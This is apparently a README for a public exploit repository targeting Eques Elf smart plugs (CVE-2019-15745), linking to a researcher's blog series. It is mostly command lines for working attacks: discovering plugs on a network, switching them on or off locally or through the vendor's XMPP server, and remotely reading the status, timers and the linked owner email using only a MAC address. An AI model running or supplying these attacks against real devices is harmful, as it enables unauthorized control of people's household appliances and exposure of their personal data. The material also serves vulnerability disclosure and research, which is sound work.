This repo contains exploit code/scripts for the eques elf smart plugs - https://equeshome.com/products/elf-smart-plug.

Full details can be found in the following four part series - https://www.ckn.io/blog/2019/08/27/exploiting-the-eques-elf-smart-plug-part-one/

The vulnerabilities have been allocated  CVE-2019-15745 - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15745
## Local attacks

To discover all smart plugs in a network:

```
go run equeslocal.go --command=discover
```
To check the status of a smart plug:

```
go run equeslocal.go --mac=<mac address of the plug> --pass=<password/name of the plug> --ip=<IP address of the plug> --command=status
```
To turn on a smart plug:

```
go run equeslocal.go --mac=<mac address of the plug> --pass=<password/name of the plug> --ip=<IP address of the plug> --command=on
```
To turn off a smart plug:

```
go run equeslocal.go --mac=<mac address of the plug> --pass=<password/name of the plug> --ip=<IP address of the plug> --command=off
```
## Remote attacks

To check the software and hardware version of a smart plug
```
go run equescommand.go --mac=<mac address of the plug> --command=version
```
To check the status of a smart plug
```
go run equescommand.go --mac=<mac address of the plug> --command=status
```
To get the email account linked to a smart plug
```
go run equescommand.go --mac=<mac address of the plug> --command=auth
```
To check if a timer is set on a smart plug
```
go run equescommand.go --mac=<mac address of the plug> --command=timer
```
To generate the message to turn the plug on over xmpp. The message can then be sent to "devicemac"@ikonkek2.com.
```
go run equesxmpp.go --devicemac=<mac address of the plug> --pass=<password/name of the plug> --command=on
```
To generate the message to turn the plug off over xmpp. The message can then be sent to "devicemac"@ikonkek2.com.
```
go run equesxmpp.go --devicemac=<mac address of the plug> --pass=<password/name of the plug> --command=off
```
